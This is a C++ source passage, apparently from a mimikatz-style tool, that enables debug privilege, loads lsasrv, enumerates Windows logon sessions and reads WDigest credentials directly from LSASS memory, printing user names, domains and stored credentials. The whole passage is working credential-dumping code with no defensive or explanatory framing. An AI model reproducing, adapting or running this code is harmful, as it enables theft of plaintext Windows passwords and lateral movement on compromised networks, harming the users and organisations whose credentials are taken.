		offsetWDigestPrimary = ((GLOB_Version.dwMajorVersion < 6) ? ((GLOB_Version.dwMinorVersion < 2) ? 36 : 48) : 48);
#elif defined _M_IX86
		offsetWDigestPrimary = ((GLOB_Version.dwMajorVersion < 6) ? ((GLOB_Version.dwMinorVersion < 2) ? 36 : 28) : 32);
#endif
	}
	return (pModWDIGEST && l_LogSessList);
}

bool WINAPI getWDigestLogonData(__in PLUID logId)
{
	if (searchWDigestEntryList())
	{
		PGENERIC_PRIMARY_CREDENTIAL mesCreds = NULL;
		DWORD taille = offsetWDigestPrimary + sizeof(GENERIC_PRIMARY_CREDENTIAL);
		BYTE * monBuff = new BYTE[taille];
		if(PLIST_ENTRY pLogSession = getPtrFromLinkedListByLuid(reinterpret_cast<PLIST_ENTRY>(l_LogSessList), FIELD_OFFSET(WDIGEST_LIST_ENTRY, LocallyUniqueIdentifier), logId))
			if(	readMemory(pLogSession, monBuff, taille, hLSASS))
				mesCreds = reinterpret_cast<PGENERIC_PRIMARY_CREDENTIAL>(reinterpret_cast<PBYTE>(monBuff) + offsetWDigestPrimary);
		genericCredsToStream(mesCreds);
		delete [] monBuff;
	}
	else wcout << L"n.a. (wdigest Error)";

	return true;
}

bool getLogonData()
{
	PLUID sessions;
	ULONG count;

	if (NT_SUCCESS(LsaEnumerateLogonSessions(&count,&sessions)))
	{
		for (UINT i = 0; i < count; i++)
		{
			PSECURITY_LOGON_SESSION_DATA sessionData = NULL;
			if (NT_SUCCESS(LsaGetLogonSessionData(&sessions[i],&sessionData)))
			{
				if (sessionData->LogonType != Network)
				{
					wostringstream woss;
					woss << endl <<
						TEXT("Authentication Id:") << sessions[i].HighPart << TEXT(";") << sessions[i].LowPart << endl <<
						TEXT("Authentication Package:") << stringOfSTRING(sessionData->AuthenticationPackage) << endl <<
						TEXT("Primary User:") << stringOfSTRING(sessionData->UserName) << endl <<
						TEXT("Authentication Domain:") << stringOfSTRING(sessionData->LogonDomain) << endl;

					wcout << woss.str();

					getWDigestLogonData(&sessions[i]);
					wcout << endl;

				}
				LsaFreeReturnBuffer(sessionData);
			}
		}
		LsaFreeReturnBuffer(sessions);
	}
	return true;
}

bool loadLsaSrv()
{
	if(!hLsaSrv)
		hLsaSrv = LoadLibrary(L"lsasrv");

	
	return (hLsaSrv != NULL);
}

int _tmain(int argc, _TCHAR* argv[])
{
	system("color 0a");
	system("chcp 936");
	wcout.imbue(locale("chs"));
	Privilege(SE_DEBUG_NAME,TRUE);
	if (getVersion(&GLOB_Version))
	{
		loadLsaSrv();
		getLogonData();
	}
	else
		cout << "get Windows Version ERROR" << endl;
	wait();
	return 0;
}


